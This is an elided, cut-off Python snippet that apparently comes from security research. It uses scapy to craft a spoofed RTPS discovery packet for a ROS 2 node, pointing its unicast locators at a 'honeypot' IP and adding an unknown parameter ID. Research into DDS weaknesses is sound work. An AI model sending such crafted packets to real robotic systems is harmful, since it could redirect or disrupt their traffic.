...
from scapy.contrib.rtps.pid_types
from scapy.layers.inet import IP, UDP

from common import APP_ID, HOST_ID, INSTANCE_ID, HONEYPOT_IP


def send_enclave(ros2_node_ip):
    rtps_packet = RTPS(
                        ...
                        parameterValues=[
                            ...
                            PID_METATRAFFIC_UNICAST_LOCATOR(
                                ...
                                locator=LocatorPacket(
                                    locatorKind=1, port=7410, address=HONEYPOT_IP
                                ),
                            ),
                            PID_DEFAULT_UNICAST_LOCATOR(
                                parameterId=49,
                                parameterLength=24,
                                locator=LocatorPacket(
                                    locatorKind=16, port=7411, address=HONEYPOT_IP
                                ),
                            ),
                            PID_UNKNOWN(
                                parameterId=38997,
